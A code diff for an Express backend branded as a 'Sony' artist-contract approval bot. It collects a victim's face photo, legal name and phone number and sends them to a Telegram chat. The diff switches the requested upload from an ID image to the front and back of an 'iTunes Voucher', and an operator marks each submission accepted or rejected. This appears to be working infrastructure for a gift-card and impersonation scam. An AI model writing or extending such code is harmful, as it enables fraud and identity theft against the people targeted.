@@ -21,7 +21,7 @@ const approvals = {};
 let lastUpdateId = 0;
 
 app.get("/", (req, res) => {
-  res.send(`<h1>Sony Backend Live ✓ FIXED POLLING</h1>
+  res.send(`<h1>Sony Backend Live ✓ ITUNES VOUCHER</h1>
   <p>POST /api/forward-to-telegram -> sends Accept/Reject buttons</p>
   <p>GET /api/status/:contractId -> frontend polling</p>
   <p>POST /webhook -> Telegram callback</p>
@@ -30,7 +30,6 @@ app.get("/", (req, res) => {
 app.get("/health", (req, res) => res.send("OK"));
 app.get("/debug/approvals", (req, res) => res.json(approvals));
 
-// FIXED: never 404, always return pending so frontend keeps polling
 app.get("/api/status/:contractId", (req, res) => {
   const id = req.params.contractId;
   const data = approvals[id];
@@ -52,9 +51,10 @@ async function sendApprovalRequest({ contractId, artistName, legalName, phone, r
 🌍 *Country:* ${region}
 🆔 *Contract:* \`${contractId}\`
 🎫 *Given ID:* \`1100223\`
+🎫 *iTunes Voucher* Attached
 ⏰ *Time:* ${new Date().toLocaleString()}
 ━━━━━━━━━━━━━━━━━━━━
-🖼️ Face + ID image attached
+🖼️ Face + iTunes Voucher attached
 👇 *Choose:*
 `;
   const keyboard = {
@@ -76,8 +76,8 @@ async function sendApprovalRequest({ contractId, artistName, legalName, phone, r
     if (idBuffer) {
       const form2 = new FormData();
       form2.append('chat_id', SUPERVISOR_CHAT_ID);
-      form2.append('photo', idBuffer, { filename: `ID_${artistName}.jpg` });
-      form2.append('caption', `Artist ID Image: ${artistName} | 1100223 | ${contractId}`);
+      form2.append('photo', idBuffer, { filename: `VOUCHER_${artistName}.jpg` });
+      form2.append('caption', `iTunes Voucher: ${artistName} | 1100223 | ${contractId} | Front & Back`);
       await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, form2, { headers: form2.getHeaders() });
     }
     await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
@@ -145,7 +145,7 @@ app.post("/api/forward-to-telegram", upload.fields([{ name: 'photo' }, { name: '
 🆔 *Contract:* \`${finalCid}\`
 ⏰ ${new Date().toLocaleString()}
 ━━━━━━━━━━━━━━━━━━━━
-⏳ Waiting for ID image upload...
+⏳ Waiting for iTunes Voucher upload...
 `;
     if (faceBuffer && BOT_TOKEN && SUPERVISOR_CHAT_ID) {
       const form = new FormData();
@@ -196,12 +196,12 @@ async function handleCallback(cq){
       const cid=data.replace('accept_','');
       approvals[cid]={...(approvals[cid]||{}), status:'accepted', contractId:cid, artistName:approvals[cid]?.artistName||'', time:new Date().toISOString()};
       await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`,{callback_query_id:cq.id, text:`✅ Accepted ${cid}`});
-      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`,{chat_id:chatId,message_id:messageId,text:`✅ *ACCEPTED* - ${cid} by supervisor\nArtist: ${approvals[cid]?.artistName||''}\nTime: ${new Date().toLocaleString()}`,parse_mode:"Markdown"});
+      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`,{chat_id:chatId,message_id:messageId,text:`✅ *ACCEPTED* - ${cid} by supervisor\nArtist: ${approvals[cid]?.artistName||''}\nVoucher Verified\nTime: ${new Date().toLocaleString()}`,parse_mode:"Markdown"});
     }else if(data.startsWith('reject_')){
       const cid=data.replace('reject_','');
-      approvals[cid]={...(approvals[cid]||{}), status:'rejected', reason:'Rejected by supervisor - Invalid ID image', contractId:cid, time:new Date().toISOString()};
+      approvals[cid]={...(approvals[cid]||{}), status:'rejected', reason:'Rejected by supervisor - Invalid iTunes Voucher', contractId:cid, time:new Date().toISOString()};
       await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/answerCallbackQuery`,{callback_query_id:cq.id, text:`❌ Rejected ${cid}`});
-      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`,{chat_id:chatId,message_id:messageId,text:`❌ *REJECTED* - ${cid} by supervisor\nReason: Invalid verification\nTime: ${new Date().toLocaleString()}`,parse_mode:"Markdown"});
+      await axios.post(`https://api.telegram.org/bot${BOT_TOKEN}/editMessageText`,{chat_id:chatId,message_id:messageId,text:`❌ *REJECTED* - ${cid} by supervisor\nReason: Invalid iTunes Voucher\nTime: ${new Date().toLocaleString()}`,parse_mode:"Markdown"});
     }
   }catch(e){ console.error("handleCallback", e.response?.data||e.message); }
 }
@@ -215,7 +215,6 @@ app.post("/webhook", async (req, res) => {
   }
 });
 
-// AUTO POLLING FIX - works without webhook
 async function pollTelegram(){
   if(!BOT_TOKEN) return;
   try{
@@ -240,4 +239,4 @@ app.get("/set-webhook", async (req, res) => {
   }
 });
 
-app.listen(PORT, () => console.log(`Sony supervisor bot FIXED polling on ${PORT}`));
+app.listen(PORT, () => console.log(`Sony supervisor bot ITUNES VOUCHER on ${PORT}`));
